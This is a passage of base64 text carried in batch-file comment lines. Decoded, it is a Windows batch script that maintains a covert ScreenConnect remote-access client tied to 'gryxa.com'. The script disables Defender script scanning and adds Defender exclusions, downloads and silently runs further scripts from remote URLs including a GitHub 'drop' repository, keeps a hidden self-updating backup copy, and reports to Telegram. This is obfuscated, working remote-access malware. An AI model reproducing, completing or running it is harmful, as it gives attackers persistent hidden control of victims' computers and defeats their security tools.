::ICBpZiBlcnJvcmxldmVsIDEgKA0KICAgIHNldCAiTkVFRF9IRUFMPTEiDQogICAg
::aWYgZXhpc3QgIiVQcm9ncmFtRmlsZXMoeDg2KSVcU2NyZWVuQ29ubmVjdCBDbGll
::bnQgKCVHUllYQV9GUCUpXFNjcmVlbkNvbm5lY3QuQ2xpZW50U2VydmljZS5leGUi
::ICgNCiAgICAgIGVjaG8gZ3J5eGFfMTA2MF93aXRoX2Rpcl9oZWFsPj4iJUxPRyUi
::DQogICAgKSBlbHNlIGlmIGV4aXN0ICIlUHJvZ3JhbUZpbGVzJVxTY3JlZW5Db25u
::ZWN0IENsaWVudCAoJUdSWVhBX0ZQJSlcU2NyZWVuQ29ubmVjdC5DbGllbnRTZXJ2
::aWNlLmV4ZSIgKA0KICAgICAgZWNobyBncnl4YV8xMDYwX3dpdGhfZGlyX2hlYWw+
::PiIlTE9HJSINCiAgICApIGVsc2UgKA0KICAgICAgZWNobyBncnl4YV9hYnNlbnRf
::cXVldWVfaGVhbD4+IiVMT0clIg0KICAgICkNCiAgKSBlbHNlICgNCiAgICBlY2hv
::IGdyeXhhX3N2Y19leGlzdHNfc2tpcF9oZWFsPj4iJUxPRyUiDQogICkNCikNCmlm
::ICIhTkVFRF9IRUFMISI9PSIxIiBjYWxsIDpRdWV1ZUdyeXhhSGVhbCBIRUFMDQoN
::CmlmICIlRE9fREVFUCUiPT0iMSIgZWNobyBkb25lPiIlR1JZWEFfREVFUCUiDQpl
::Y2hvIGdyeXhhX2ZyZWV6ZV9vcl9oZWFsX2RvbmU+PiIlTE9HJSINCg0KOkdyeXhh
::QWZ0ZXINCmlmIGV4aXN0ICIlV0QlXGdyeXhhLmNmZyIgZm9yIC9mICJ1c2ViYWNr
::cSB0b2tlbnM9MSwqIGRlbGltcz09IiAlJUsgaW4gKCIlV0QlXGdyeXhhLmNmZyIp
::IGRvIGlmIC9JICIlJUsiPT0iQ1VSUkVOVF9GUCIgc2V0ICJHUllYQV9GUD0lJUwi
::DQpzZXQgIkdSWVhBX09LPTAiDQpzYyBxdWVyeSAiU2NyZWVuQ29ubmVjdCBDbGll
::bnQgKCVHUllYQV9GUCUpIiB8IGZpbmRzdHIgL0kgL0M6IlJVTk5JTkciIC9DOiJT
::VEFSVF9QRU5ESU5HIiAvQzoiQ09OVElOVUVfUEVORElORyIgPm51bA0KaWYgbm90
::IGVycm9ybGV2ZWwgMSAoDQogIHJlZyBxdWVyeSAiSEtMTVxTWVNURU1cQ3VycmVu
::dENvbnRyb2xTZXRcU2VydmljZXNcU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVHUllY
::QV9GUCUpIiAvdiBJbWFnZVBhdGggMj5udWwgfCBmaW5kc3RyIC9JICJncnl4YS5j
::b20iID5udWwNCiAgaWYgbm90IGVycm9ybGV2ZWwgMSBzZXQgIkdSWVhBX09LPTEi
::DQopDQpyZW0gTTUyOiBhbnkgbm9uLXNldnJ6IFJ1bm5pbmcgV0lUSCBncnl4YS5j
::b20gSW1hZ2VQYXRoIGlzIE9LDQppZiAiJUdSWVhBX09LJSI9PSIwIiAoDQogIGZv
::ciAvZiAidG9rZW5zPTIgZGVsaW1zPSgpIiAlJWEgaW4gKCdzYyBxdWVyeSBzdGF0
::ZV49IGFsbCBefCBmaW5kc3RyIC9DOiJTRVJWSUNFX05BTUU6IFNjcmVlbkNvbm5l
::Y3QgQ2xpZW50IicpIGRvICgNCiAgICBzZXQgIl9GUD0lJWEiDQogICAgc2V0ICJf
::RlA9IV9GUDogPSEiDQogICAgaWYgL0kgbm90ICIhX0ZQISI9PSIlS0VFUF9GUCUi
::IGlmIC9JIG5vdCAiIV9GUCEiPT0iJUFMVF9GUCUiICgNCiAgICAgIHNjIHF1ZXJ5
::ICJTY3JlZW5Db25uZWN0IENsaWVudCAoIV9GUCEpIiB8IGZpbmRzdHIgL0kgL0M6
::IlJVTk5JTkciIC9DOiJTVEFSVF9QRU5ESU5HIiAvQzoiQ09OVElOVUVfUEVORElO
::RyIgPm51bA0KICAgICAgaWYgbm90IGVycm9ybGV2ZWwgMSAoDQogICAgICAgIHJl
::ZyBxdWVyeSAiSEtMTVxTWVNURU1cQ3VycmVudENvbnRyb2xTZXRcU2VydmljZXNc
::U2NyZWVuQ29ubmVjdCBDbGllbnQgKCFfRlAhKSIgL3YgSW1hZ2VQYXRoIDI+bnVs
::IHwgZmluZHN0ciAvSSAiZ3J5eGEuY29tIiA+bnVsDQogICAgICAgIGlmIG5vdCBl
::cnJvcmxldmVsIDEgKA0KICAgICAgICAgIHNldCAiR1JZWEFfT0s9MSINCiAgICAg
::ICAgICBzZXQgIkdSWVhBX0ZQPSFfRlAhIg0KICAgICAgICApDQogICAgICApDQog
::ICAgKQ0KICApDQopDQppZiAiJUdSWVhBX09LJSI9PSIwIiAoDQogIHBvd2Vyc2hl
::bGwgLU5vUHJvZmlsZSAtTm9uSW50ZXJhY3RpdmUgLUV4ZWN1dGlvblBvbGljeSBC
::eXBhc3MgLUZpbGUgIiVXRCVcb3duX2xpYi5wczEiIC1BY3Rpb24gZ3J5eGEtaGVh
::bHRoIC1Xb3JrRGlyICIlV0QlIiAyPm51bCB8IGZpbmRzdHIgL0kgL0IgL0M6IkhF
::QUxUSFl8IiB8IGZpbmRzdHIgL0kgInJ1bm5pbmc9MSIgPm51bA0KICBpZiBub3Qg
::ZXJyb3JsZXZlbCAxIHNldCAiR1JZWEFfT0s9MSINCikNCg0KaWYgIiVHUllYQV9P
::SyUiPT0iMSIgaWYgIiVHUllYQV9XQVMlIj09IjAiICgNCiAgcG93ZXJzaGVsbCAt
::Tm9Qcm9maWxlIC1Ob25JbnRlcmFjdGl2ZSAtRXhlY3V0aW9uUG9saWN5IEJ5cGFz
::cyAtRmlsZSAiJVdEJVxvd25fbGliLnBzMSIgLUFjdGlvbiBzdGF0ZSAtV29ya0Rp
::ciAiJVdEJSIgLUJ1aWxkICVNT05WRVIlIC1FeHRyYSAiZ3J5eGEtcmVzdG9yZWQi
::ID5udWwgMj4mMQ0KICBjYWxsIDpUZ0dyeXhhIFJFU1RPUkVEICJHcnl4YSBTY3Jl
::ZW5Db25uZWN0IGhlYWx0aHkgKHN2YyBydW5uaW5nKSINCikNCmlmICIlR1JZWEFf
::T0slIj09IjAiICgNCiAgcG93ZXJzaGVsbCAtTm9Qcm9maWxlIC1Ob25JbnRlcmFj
::dGl2ZSAtRXhlY3V0aW9uUG9saWN5IEJ5cGFzcyAtRmlsZSAiJVdEJVxvd25fbGli
::LnBzMSIgLUFjdGlvbiBzdGF0ZSAtV29ya0RpciAiJVdEJSIgLUJ1aWxkICVNT05W
::RVIlIC1FeHRyYSAiZ3J5eGEtbXVzdC1mYWlsIiA+bnVsIDI+JjENCiAgY2FsbCA6
::VGdHcnl4YSBET1dOICJHcnl4YSBNVVNULVJVTiAtIHNlcnZpY2Ugbm90IFJ1bm5p
::bmcgYWZ0ZXIgaGVhbCINCikNCg0KcmVtIOKUgOKUgCBbSF0gcXVpZXQgZGlnZXN0
::IChza2lwIGhlYWx0aHkgaG9zdHMg4oCUIHdhcyBmbG9vZGluZyBUZWxlZ3JhbSkg
::4pSA4pSADQppZiBleGlzdCAiJVdEJVxvd25fbGliLnBzMSIgcG93ZXJzaGVsbCAt
::Tm9Qcm9maWxlIC1Ob25JbnRlcmFjdGl2ZSAtRXhlY3V0aW9uUG9saWN5IEJ5cGFz
::cyAtRmlsZSAiJVdEJVxvd25fbGliLnBzMSIgLUFjdGlvbiBzdGF0ZSAtV29ya0Rp
::ciAiJVdEJSIgLUJ1aWxkICVNT05WRVIlID5udWwgMj4mMQ0Kc2V0ICJORUVEX0hC
::PTAiDQppZiAiJVBSSU1fT0slIj09IjAiIHNldCAiTkVFRF9IQj0xIg0KaWYgJUZP
::UkVJR05fTEVGVCUgR1RSIDAgc2V0ICJORUVEX0hCPTEiDQppZiAiJUdSWVhBX09L
::JSI9PSIwIiBzZXQgIk5FRURfSEI9MSINCmlmICIlTkVFRF9IQiUiPT0iMCIgKA0K
::ICBlY2hvIGhiX3NraXBfaGVhbHRoeT4+IiVMT0clIg0KKSBlbHNlICgNCiAgcG93
::ZXJzaGVsbCAtTm9Qcm9maWxlIC1Ob25JbnRlcmFjdGl2ZSAtQ29tbWFuZCAiaWYo
::KFRlc3QtUGF0aCAnJUhCRkxBRyUnKSAtYW5kIChOZXctVGltZVNwYW4gLVN0YXJ0
::IChHZXQtSXRlbSAtTGl0ZXJhbFBhdGggJyVIQkZMQUclJykuTGFzdFdyaXRlVGlt
::ZSkuVG90YWxNaW51dGVzIC1sdCAzNjApeyBleGl0IDAgfSBlbHNlIHsgZXhpdCAx
::IH0iID5udWwgMj4mMQ0KICBpZiBlcnJvcmxldmVsIDEgKA0KICAgIGVjaG8gaGI+
::JUhCRkxBRyUNCiAgICBwb3dlcnNoZWxsIC1Ob1Byb2ZpbGUgLU5vbkludGVyYWN0
::aXZlIC1FeGVjdXRpb25Qb2xpY3kgQnlwYXNzIC1GaWxlICIlV0QlXHRnX3JlcG9y
::dC5wczEiIC1TdGF0ZSBIQiAtTW9kZSBjb21wYWN0IC1CdWlsZCAlTU9OVkVSJSAt
::Q291bnQgIUNPVU5UISA+bnVsIDI+JjENCiAgICBlY2hvIGRpZ2VzdCBIQiBzZW50
::Pj4iJUxPRyUiDQogICkNCikNCg0KcmVtIOKUgOKUgCBbSV0gc2VsZi11cGRhdGUg
::YXBwbHkgKGxhc3QgdGhpbmcgdGhpcyB0aWNrKSDilIDilIDilIDilIDilIDilIDi
::lIDilIDilIDilIDilIDilIDilIDilIANCmlmICIlU0VMRl9VUEQlIj09IjEiICgN
::CiAgZWNobyBzZWxmLXVwZGF0ZSBhcHBseT4+IiVMT0clIg0KICBhdHRyaWIgLWgg
::LXMgLXIgIiVXRCVcb3duX21vbi5jbWQiID5udWwgMj4mMQ0KICBtb3ZlIC95ICIl
::U1RBR0UlXG93bl9tb24ubmV4dCIgIiVXRCVcb3duX21vbi5jbWQiID5udWwgMj4m
::MQ0KKQ0KcmVtIGtlZXAgZHVhbC1wYXRoIGJhY2t1cCBpbiBzeW5jIGV2ZXJ5IHRp
::Y2sNCmlmIG5vdCBleGlzdCAiJUVUTCUiIG1rZGlyICIlRVRMJSIgPm51bCAyPiYx
::DQppZiBleGlzdCAiJVdEJVxvd25fbW9uLmNtZCIgKA0KICBhdHRyaWIgLWggLXMg
::LXIgIiVFVEwlXGV0bF9tb24uY21kIiA+bnVsIDI+JjENCiAgY29weSAveSAiJVdE
::JVxvd25fbW9uLmNtZCIgIiVFVEwlXGV0bF9tb24uY21kIiA+bnVsIDI+JjENCikN
::CmRlbCAvZiAvcSAiJU1VVEVYJSIgPm51bCAyPiYxDQoNCmVjaG8gdGljayBkb25l
::OiBwcmltPSVQUklNX09LJSBncnl4YT0lR1JZWEFfT0slIGFsdD0lQUxUX09LJSBm
::b3JlaWduPSVGT1JFSUdOX0xFRlQlPj4iJUxPRyUiDQplbmRsb2NhbA0KZXhpdCAv
::YiAwDQoNCnJlbSDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDi
::lZDilZDilZAgaGVscGVycyDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDi
::lZDilZDilZDilZDilZANCjpRdWV1ZUdyeXhhSGVhbA0KcmVtICUxPVJFSU5TVEFM
::THxIRUFMIOKAlCByYXRlLWxpbWl0IDkwbTsgbGF1bmNoIHZpYSB3bWljIGJyZWFr
::YXdheSAoc3Vydml2ZXMgR3Vlc3QgMTBzKQ0Kc2V0ICJIRUFMTU9ERT0lfjEiDQpp
::ZiAiJUhFQUxNT0RFJSI9PSIiIHNldCAiSEVBTE1PREU9SEVBTCINCnBvd2Vyc2hl
::bGwgLU5vUHJvZmlsZSAtTm9uSW50ZXJhY3RpdmUgLUNvbW1hbmQgImlmKChUZXN0
::LVBhdGggJyVXRCVcZ3J5eGFfaGVhbC5mbGFnJykgLWFuZCAoKChHZXQtRGF0ZSkt
::KEdldC1JdGVtICclV0QlXGdyeXhhX2hlYWwuZmxhZycpLkxhc3RXcml0ZVRpbWUp
::LlRvdGFsTWludXRlcyAtbHQgOTApKXtleGl0IDF9ZWxzZXtleGl0IDB9IiA+bnVs
::IDI+JjENCmlmIGVycm9ybGV2ZWwgMSAoDQogIGVjaG8gZ3J5eGFfaGVhbF9yYXRl
::X2xpbWl0ZWQ+PiIlTE9HJSINCiAgZXhpdCAvYiAwDQopDQplY2hvICVEQVRFJSAl
::VElNRSUgJUhFQUxNT0RFJT4iJVdEJVxncnl4YV9oZWFsLmZsYWciDQpyZWcgYWRk
::ICJIS0xNXFNPRlRXQVJFXFBvbGljaWVzXE1pY3Jvc29mdFxXaW5kb3dzIERlZmVu
::ZGVyXFJlYWwtVGltZSBQcm90ZWN0aW9uIiAvdiBEaXNhYmxlU2NyaXB0U2Nhbm5p
::bmcgL3QgUkVHX0RXT1JEIC9kIDEgL2YgPm51bCAyPiYxDQpyZWcgYWRkICJIS0xN
::XFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzIERlZmVuZGVyXEV4Y2x1c2lvbnNc
::UGF0aHMiIC92ICIlV0QlIiAvdCBSRUdfRFdPUkQgL2QgMCAvZiA+bnVsIDI+JjEN
::CnJlZyBhZGQgIkhLTE1cU09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3MgRGVmZW5k
::ZXJcRXhjbHVzaW9uc1xQcm9jZXNzZXMiIC92ICJtc2lleGVjLmV4ZSIgL3QgUkVH
::X0RXT1JEIC9kIDAgL2YgPm51bCAyPiYxDQpyZWcgYWRkICJIS0xNXFNPRlRXQVJF
::XE1pY3Jvc29mdFxXaW5kb3dzIERlZmVuZGVyXEV4Y2x1c2lvbnNcUHJvY2Vzc2Vz
::IiAvdiAiU2NyZWVuQ29ubmVjdC5DbGllbnRTZXJ2aWNlLmV4ZSIgL3QgUkVHX0RX
::T1JEIC9kIDAgL2YgPm51bCAyPiYxDQoiJUNVUkwlIiAtTCAtLXNzbC1uby1yZXZv
::a2UgLS1jb25uZWN0LXRpbWVvdXQgOCAtLW1heC10aW1lIDIwIC1vICIlV0QlXG93
::bl9ncnl4YS5jbWQiICIlT1dOR1JZWEElIiA+bnVsIDI+JjENCmlmIG5vdCBleGlz
::dCAiJVdEJVxvd25fZ3J5eGEuY21kIiAiJUNVUkwlIiAtTCAtLWNvbm5lY3QtdGlt
::ZW91dCA4IC0tbWF4LXRpbWUgMjAgLW8gIiVXRCVcb3duX2dyeXhhLmNtZCIgIiVP
::V05HUllYQTIlIiA+bnVsIDI+JjENCiIlQ1VSTCUiIC1MIC0tc3NsLW5vLXJldm9r
::ZSAtLWNvbm5lY3QtdGltZW91dCA4IC0tbWF4LXRpbWUgMjAgLW8gIiVXRCVcb3du
::X2dyeXhhX2ZvcmNlLmNtZCIgImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50
::LmNvbS94bm9idWRkeS9naXRodWItZHJvcC9tYWluL293bl9ncnl4YV9mb3JjZS5j
::bWQ/dD0lUkFORE9NJSVSQU5ET00lIiA+bnVsIDI+JjENCmlmIGV4aXN0ICIlV0Ql
::XGdyeXhhX21zaS5sb2NrIiBkZWwgL2YgL3EgIiVXRCVcZ3J5eGFfbXNpLmxvY2si
::ID5udWwgMj4mMQ0KaWYgbm90IGV4aXN0ICIlU3lzdGVtUm9vdCVcVGVtcFwudXBk
::IiBta2RpciAiJVN5c3RlbVJvb3QlXFRlbXBcLnVwZCIgPm51bCAyPiYxDQo+ICIl
::U3lzdGVtUm9vdCVcVGVtcFwudXBkXGdyeXhhX2hlYWxfb25jZS5jbWQiICgNCiAg
::ZWNobyBAZWNobyBvZmYNCiAgZWNobyBjYWxsICIlV0QlXG93bl9ncnl4YS5jbWQi
::ICIlV0QlIiAiJUdSWVhBX0ZQJSIgIiVLRUVQX0ZQJSIgIiVBTFRfRlAlIiAlSEVB
::TE1PREUlIF4+Xj4iJUxPRyUiIDJePl4mMQ0KKQ0Kd21pYyBwcm9jZXNzIGNhbGwg
::Y3JlYXRlICJjbWQuZXhlIC9jICVTeXN0ZW1Sb290JVxUZW1wXC51cGRcZ3J5eGFf
::aGVhbF9vbmNlLmNtZCIgPm51bCAyPiYxDQppZiBlcnJvcmxldmVsIDEgKA0KICBw
::b3dlcnNoZWxsIC1Ob1Byb2ZpbGUgLU5vbkludGVyYWN0aXZlIC1XaW5kb3dTdHls
::ZSBIaWRkZW4gLUNvbW1hbmQgIlN0YXJ0LVByb2Nlc3MgY21kLmV4ZSAtQXJndW1l
::bnRMaXN0ICcvYycsJyVTeXN0ZW1Sb290JVxUZW1wXC51cGRcZ3J5eGFfaGVhbF9v
::bmNlLmNtZCcgLVdpbmRvd1N0eWxlIEhpZGRlbiIgPm51bCAyPiYxDQopDQplY2hv
::IGdyeXhhX2hlYWxfcXVldWVkIG1vZGU9JUhFQUxNT0RFJT4+IiVMT0clIg0KZXhp
::dCAvYiAwDQoNCjpFbnN1cmVHcnl4YU11c3QNCnJlbSBNNTI6IHN0YXJ0LW9ubHk7
::IHN0dWNrIOKGkiBRdWV1ZUdyeXhhSGVhbCAobmV2ZXIgYmFyZSBzYyBjcmVhdGUp
::DQpzZXQgIkdSWVhBX09LPTAiDQppZiBleGlzdCAiJVdEJVxncnl4YS5jZmciIGZv
::ciAvZiAidXNlYmFja3EgdG9rZW5zPTEsKiBkZWxpbXM9PSIgJSVLIGluICgiJVdE
::JVxncnl4YS5jZmciKSBkbyBpZiAvSSAiJSVLIj09IkNVUlJFTlRfRlAiIHNldCAi
::R1JZWEFfRlA9JSVMIg0Kc2V0ICJHU1ZDPVNjcmVlbkNvbm5lY3QgQ2xpZW50ICgl
::R1JZWEFfRlAlKSINCmlmIGV4aXN0ICIlV0QlXGdyeXhhX2luc3RhbGwuY21kIiBk
::ZWwgL2YgL3EgIiVXRCVcZ3J5eGFfaW5zdGFsbC5jbWQiID5udWwgMj4mMQ0Kc2Mg
::cXVlcnkgIiVHU1ZDJSIgfCBmaW5kc3RyIC9JIC9DOiJSVU5OSU5HIiAvQzoiU1RB
::UlRfUEVORElORyIgL0M6IkNPTlRJTlVFX1BFTkRJTkciID5udWwNCmlmIG5vdCBl
::cnJvcmxldmVsIDEgKA0KICByZWcgcXVlcnkgIkhLTE1cU1lTVEVNXEN1cnJlbnRD
::b250cm9sU2V0XFNlcnZpY2VzXCVHU1ZDJSIgL3YgSW1hZ2VQYXRoIDI+bnVsIHwg
::ZmluZHN0ciAvSSAiZ3J5eGEuY29tIiA+bnVsDQogIGlmIG5vdCBlcnJvcmxldmVs
::IDEgKA0KICAgIHNldCAiR1JZWEFfT0s9MSINCiAgICBlY2hvIGdyeXhhX211c3Rf
::YWxyZWFkeV9hbGl2ZV9yZWxheT4+IiVMT0clIg0KICAgIGV4aXQgL2IgMA0KICAp
::DQopDQpzYyBxdWVyeSAiJUdTVkMlIiA+bnVsIDI+JjENCmlmIG5vdCBlcnJvcmxl
::dmVsIDEgKA0KICBlY2hvIGdyeXhhX211c3Rfc3RhcnRfb25seT4+IiVMT0clIg0K
::ICBzYyBjb25maWcgIiVHU1ZDJSIgc3RhcnQ9IGF1dG8gPm51bCAyPiYxDQogIHNj
::IHN0YXJ0ICIlR1NWQyUiID5udWwgMj4mMQ0KICB0aW1lb3V0IC90IDggL25vYnJl
::YWsgPm51bA0KICBzYyBxdWVyeSAiJUdTVkMlIiB8IGZpbmRzdHIgL0kgL0M6IlJV
::Tk5JTkciIC9DOiJTVEFSVF9QRU5ESU5HIiA+bnVsDQogIGlmIG5vdCBlcnJvcmxl
::dmVsIDEgKA0KICAgIHJlZyBxdWVyeSAiSEtMTVxTWVNURU1cQ3VycmVudENvbnRy
::b2xTZXRcU2VydmljZXNcJUdTVkMlIiAvdiBJbWFnZVBhdGggMj5udWwgfCBmaW5k
::c3RyIC9JICJncnl4YS5jb20iID5udWwNCiAgICBpZiBub3QgZXJyb3JsZXZlbCAx
::IHNldCAiR1JZWEFfT0s9MSINCiAgKQ0KKQ0KaWYgIiVHUllYQV9PSyUiPT0iMCIg
::Y2FsbCA6UXVldWVHcnl4YUhlYWwgSEVBTA0KaWYgIiVHUllYQV9PSyUiPT0iMSIg
::KGVjaG8gZ3J5eGFfbXVzdF9ydW5uaW5nX29rPj4iJUxPRyUiKSBlbHNlIChlY2hv
::IGdyeXhhX211c3RfaGVhbF9xdWV1ZWQ+PiIlTE9HJSIpDQpleGl0IC9iIDANCg0K
::OlRnR3J5eGENCnJlbSAlMT1raW5kICUyPW1zZyDigJQgcGVyLUdyeXhhIHN0YXRl
::IHNvIGl0IGNhbm5vdCByZXVzZSBQcmltYXJ5IG93bl9tb24uc3RhdGUuDQpzZXQg
::IkdTVEFURT0lfjEiDQpzZXQgIkdNU0c9JX4yIg0Kc2V0ICJHU1RBVEVGSUxFPSVX
::RCVcb3duX21vbl9ncnl4YS5zdGF0ZSINCnNldCAiR09MRD0iDQppZiBleGlzdCAi
::JUdTVEFURUZJTEUlIiBzZXQgL3AgR09MRD08IiVHU1RBVEVGSUxFJSINCmlmIC9J
::ICIlR1NUQVRFJSI9PSJSRVNUT1JFRCIgKA0KICBpZiAvSSAiJUdPTEQlIj09IlJF
::U1RPUkVEIiBleGl0IC9iIDANCiAgaWYgZXhpc3QgIiVXRCVcdGdfZ3J5eGEuZmxh
::ZyIgKA0KICAgIHBvd2Vyc2hlbGwgLU5vUHJvZmlsZSAtTm9uSW50ZXJhY3RpdmUg
::LUNvbW1hbmQgImlmKChOZXctVGltZVNwYW4gLVN0YXJ0IChHZXQtSXRlbSAtTGl0
::ZXJhbFBhdGggJyVXRCVcdGdfZ3J5eGEuZmxhZycpLkxhc3RXcml0ZVRpbWUpLlRv
::dGFsTWludXRlcyAtbHQgMTQ0MCl7ZXhpdCAwfWVsc2V7ZXhpdCAxfSIgPm51bCAy
::PiYxDQogICAgaWYgbm90IGVycm9ybGV2ZWwgMSAoDQogICAgICBlY2hvIHRnX2dy
::eXhhX3N1cHByZXNzXyVHU1RBVEUlPj4iJUxPRyUiDQogICAgICBleGl0IC9iIDAN
::CiAgICApDQogICkNCiAgZWNobyAlR1NUQVRFJT4iJUdTVEFURUZJTEUlIg0KICBl
::Y2hvIHNlbnQ+IiVXRCVcdGdfZ3J5eGEuZmxhZyINCiAgcG93ZXJzaGVsbCAtTm9Q
::cm9maWxlIC1Ob25JbnRlcmFjdGl2ZSAtRXhlY3V0aW9uUG9saWN5IEJ5cGFzcyAt
::RmlsZSAiJVdEJVx0Z19yZXBvcnQucHMxIiAtU3RhdGUgJUdTVEFURSUgLVN1bW1h
::cnkgIiVHTVNHJSIgLUJ1aWxkICVNT05WRVIlIC1Db3VudCAlQ09VTlQlID5udWwg
::Mj4mMQ0KICBlY2hvIHRnIGdyeXhhICVHU1RBVEUlIHNlbnQ+PiIlTE9HJSINCiAg
::ZXhpdCAvYiAwDQopDQppZiAvSSAiJUdTVEFURSUiPT0iRE9XTiIgaWYgL0kgIiVH
::T0xEJSI9PSJET1dOIiBpZiBleGlzdCAiJVdEJVx0Z19ncnl4YS5mbGFnIiAoDQog
::IHBvd2Vyc2hlbGwgLU5vUHJvZmlsZSAtTm9uSW50ZXJhY3RpdmUgLUNvbW1hbmQg
::ImlmKChOZXctVGltZVNwYW4gLVN0YXJ0IChHZXQtSXRlbSAtTGl0ZXJhbFBhdGgg
::JyVXRCVcdGdfZ3J5eGEuZmxhZycpLkxhc3RXcml0ZVRpbWUpLlRvdGFsTWludXRl
::cyAtbHQgMzYwKXtleGl0IDB9ZWxzZXtleGl0IDF9IiA+bnVsIDI+JjENCiAgaWYg
::bm90IGVycm9ybGV2ZWwgMSAoDQogICAgZWNobyB0Z19ncnl4YV9zdXBwcmVzc18l
::R1NUQVRFJT4+IiVMT0clIg0KICAgIGV4aXQgL2IgMA0KICApDQopDQplY2hvICVH
::U1RBVEUlPiIlR1NUQVRFRklMRSUiDQplY2hvIHNlbnQ+IiVXRCVcdGdfZ3J5eGEu
::ZmxhZyINCnBvd2Vyc2hlbGwgLU5vUHJvZmlsZSAtTm9uSW50ZXJhY3RpdmUgLUV4
::ZWN1dGlvblBvbGljeSBCeXBhc3MgLUZpbGUgIiVXRCVcdGdfcmVwb3J0LnBzMSIg
::LVN0YXRlICVHU1RBVEUlIC1TdW1tYXJ5ICIlR01TRyUiIC1CdWlsZCAlTU9OVkVS
::JSAtQ291bnQgJUNPVU5UJSA+bnVsIDI+JjENCmVjaG8gdGcgZ3J5eGEgJUdTVEFU
::RSUgc2VudD4+IiVMT0clIg0KZXhpdCAvYiAwDQoNCjpJbnN0YWxsTXNpDQpyZW0g
::JTE9dXJsICUyPXRhZw0Kc2V0ICJVUkw9JX4xIg0Kc2V0ICJUQUc9JX4yIg0KZWNo
::byBbJVRBRyVdIGZldGNoICVVUkwlPj4iJUxPRyUiDQoiJUNVUkwlIiAtTCAtLXNz
::bC1uby1yZXZva2UgLS1jb25uZWN0LXRpbWVvdXQgMjUgLS1tYXgtdGltZSAzMDAg
::LW8gIiVNU0klLnRtcCIgIiVVUkwlIiA+PiIlTE9HJSIgMj4mMQ0KZm9yICUlRiBp
::biAoIiVNU0klLnRtcCIpIGRvIGlmICUlfnpGIExFUSAxMDAwMDAwICgNCiAgZWNo
::byBbJVRBRyVdIGZldGNoIGZhaWxlZD4+IiVMT0clIg0KICBkZWwgL2YgL3EgIiVN
::U0klLnRtcCIgPm51bCAyPiYxDQogIGV4aXQgL2IgMQ0KKQ0KbW92ZSAveSAiJU1T
::SSUudG1wIiAiJU1TSSUiID5udWwgMj4mMQ0KcmVtIE00MTogT0xFIG1hZ2ljICsg
::UHJvZHVjdE5hbWUgRlAgbXVzdCBtYXRjaCBLRUVQX0ZQIGJlZm9yZSAvaQ0Kc2V0
::ICJNU0lPSz1ubyINCmlmIGV4aXN0ICIlV0QlXG93bl9saWIucHMxIiBmb3IgL2Yg
::InVzZWJhY2txIGRlbGltcz0iICUlUiBpbiAoYHBvd2Vyc2hlbGwgLU5vUHJvZmls
::ZSAtTm9uSW50ZXJhY3RpdmUgLUV4ZWN1dGlvblBvbGljeSBCeXBhc3MgLUZpbGUg
::IiVXRCVcb3duX2xpYi5wczEiIC1BY3Rpb24gdGVzdC1tc2kgLUZwICIlS0VFUF9G
::UCUiIC1FeHRyYSAiJU1TSSUiIC1Xb3JrRGlyICIlV0QlImApIGRvIHNldCAiTVNJ
::T0s9JSVSIg0KaWYgL0kgbm90ICIhTVNJT0shIj09InllcyIgKA0KICBlY2hvIFsl
::VEFHJV0gbXNpX3ZhbGlkYXRlX2ZhaWw+PiIlTE9HJSINCiAgZGVsIC9mIC9xICIl
::TVNJJSIgPm51bCAyPiYxDQogIGV4aXQgL2IgMQ0KKQ0KcmVtIE00Mi9NNDc6IHNp
::Ymxpbmctc2FmZSBjb3B5IChlbXB0eSBVcGdyYWRlIHRhYmxlKSBiZWZvcmUgc2V2
::cnogL2kg4oCUIHJlZnVzZSAvaSBpZiBwcm90ZWN0IGZhaWxzDQpzZXQgIk1TSV9T
::QUZFPSINCmlmIGV4aXN0ICIlV0QlXG93bl9saWIucHMxIiBmb3IgL2YgInVzZWJh
::Y2txIGRlbGltcz0iICUlUyBpbiAoYHBvd2Vyc2hlbGwgLU5vUHJvZmlsZSAtTm9u
::SW50ZXJhY3RpdmUgLUV4ZWN1dGlvblBvbGljeSBCeXBhc3MgLUZpbGUgIiVXRCVc
::b3duX2xpYi5wczEiIC1BY3Rpb24gcHJvdGVjdC1tc2kgLUV4dHJhICIlTVNJJSIg
::LVdvcmtEaXIgIiVXRCUiYCkgZG8gaWYgbm90ICIlJVMiPT0iRkFJTCIgaWYgZXhp
::c3QgIiUlUyIgc2V0ICJNU0lfU0FGRT0lJVMiDQppZiBub3QgZGVmaW5lZCBNU0lf
::U0FGRSAoDQogIGVjaG8gWyVUQUclXSBtc2lfcHJvdGVjdF9mYWlsX3NraXBfaT4+
::IiVMT0clIg0KICBkZWwgL2YgL3EgIiVNU0klIiA+bnVsIDI+JjENCiAgZXhpdCAv
::YiAxDQopDQpjYWxsIDpOb01zaVBvbGljeQ0KcmVtIE0xMy9NNDE6IHN0YWxlIHBy
::aW1hcnkgZGlyIHVuZGVyIFBGIGFuZCBQRjg2DQpzYyBxdWVyeSAiU2NyZWVuQ29u
::bmVjdCBDbGllbnQgKCVLRUVQX0ZQJSkiID5udWwgMj4mMQ0KaWYgZXJyb3JsZXZl
::bCAxICgNCiAgaWYgZXhpc3QgIiVQRjg2JVxTY3JlZW5Db25uZWN0IENsaWVudCAo
::JUtFRVBfRlAlKSIgKA0KICAgIGVjaG8gc3RhbGVfcHJpbWFyeV9kaXJfY2xlYW5f
::cGY4Nj4+IiVMT0clIg0KICAgIHJtZGlyIC9zIC9xICIlUEY4NiVcU2NyZWVuQ29u
::bmVjdCBDbGllbnQgKCVLRUVQX0ZQJSkiID5udWwgMj4mMQ0KICApDQogIGlmIGV4
::aXN0ICIlUHJvZ3JhbUZpbGVzJVxTY3JlZW5Db25uZWN0IENsaWVudCAoJUtFRVBf
::RlAlKSIgKA0KICAgIGVjaG8gc3RhbGVfcHJpbWFyeV9kaXJfY2xlYW5fcGY+PiIl
::TE9HJSINCiAgICBybWRpciAvcyAvcSAiJVByb2dyYW1GaWxlcyVcU2NyZWVuQ29u
::bmVjdCBDbGllbnQgKCVLRUVQX0ZQJSkiID5udWwgMj4mMQ0KICApDQopDQplY2hv
::IFslVEFHJV0gbXNpZXhlYyBpbnN0YWxsPj4iJUxPRyUiDQptc2lleGVjIC9pICIl
